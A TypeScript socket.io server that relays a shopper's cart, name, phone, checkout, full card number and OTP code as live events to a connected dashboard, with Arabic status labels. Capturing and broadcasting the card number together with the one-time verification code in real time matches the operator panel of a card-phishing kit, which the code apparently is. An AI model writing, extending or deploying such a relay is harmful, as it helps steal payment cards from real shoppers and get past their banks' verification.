import { createServer } from 'node:http'
import { Server } from 'socket.io'

type EventConfig = {
  path: string | undefined
  event: string
  getLabel: (payload: any) => string
  validate: (payload: any) => { ok: boolean; message?: string }
}

const routes: EventConfig[] = [
  {
    path: process.env.SOCKET_ADD_TO_CART,
    event: 'cart:item-added',
    getLabel: () => '🛒 تمت إضافة منتج إلى سلة التسوق',
    validate: (p) => {
      if (!p.productId || !p.productName)
        return { ok: false, message: 'productId required' }
      return { ok: true }
    },
  },
  {
    path: process.env.SOCKET_ADD_INFO,
    event: 'customer:info',
    getLabel: () => '🧾 تم إدخال بيانات العميل',
    validate: (p) => {
      if (!p.name || !p.phone)
        return { ok: false, message: 'name & phone required' }
      return { ok: true }
    },
  },
  {
    path: process.env.SOCKET_CHECKOUT,
    event: 'checkout:clicked',
    getLabel: (p) => `📦 قام ${p.name || 'عميل'} بإتمام طلب المنتج`,
    validate: (p) => {
      if (!p.name) return { ok: false, message: 'name required' }
      return { ok: true }
    },
  },
  {
    path: process.env.SOCKET_ADD_CARD,
    event: 'payment:info',
    getLabel: (p) => `💳 قام ${p.name || 'عميل'} بإدخال معلومات بطاقة الدفع`,
    validate: (p) => {
      if (!p.name || !p.cardNumber)
        return { ok: false, message: 'name & cardNumber required' }
      return { ok: true }
    },
  },
  {
    path: process.env.SOCKET_SEND_OTP,
    event: 'payment:otp',
    getLabel: (p) => `🔢 قام ${p.name || 'عميل'} بإدخال رمز التحقق (OTP)`,
    validate: (p) => {
      if (!p.name || !p.otp)
        return { ok: false, message: 'name & otp required' }
      return { ok: true }
    },
  },
]

const httpServer = createServer(async (req, res) => {
  if (req.method !== 'POST') {
    res.writeHead(404)
    return res.end()
  }

  const match = routes.find((r) => r.path && req.url === r.path)

  if (!match) {
    res.writeHead(404)
    return res.end()
  }

  let body = ''
  req.on('data', (chunk) => {
    body += chunk
  })

  req.on('end', () => {
    try {
      const payload = body ? JSON.parse(body) : {}

      // ✅ validation
      const check = match.validate(payload)
      if (!check.ok) {
        res.writeHead(400, { 'Content-Type': 'application/json' })
        return res.end(JSON.stringify({ ok: false, error: check.message }))
      }

      const label = match.getLabel(payload)

      io.emit(match.event, {
        label,
        payload,
        timestamp: new Date().toISOString(),
      })

      res.writeHead(200, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify({ ok: true, event: match.event }))
    } catch (error) {
      res.writeHead(500, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify({ ok: false, error: 'invalid JSON' }))
    }
  })
})

const io = new Server(httpServer, {
  cors: {
    origin: process.env.ORIGIN_URL,
    methods: ['GET', 'POST'],
  },
})

io.on('connection', (socket) => {
  console.log('dashboard connected:', socket.id)

  socket.on('disconnect', () => {
    console.log('dashboard disconnected:', socket.id)
  })
})

const PORT = process.env.PORT || 4001

httpServer.listen(PORT, () => {
  console.log(`Socket server running on http://localhost:${PORT}`)
})
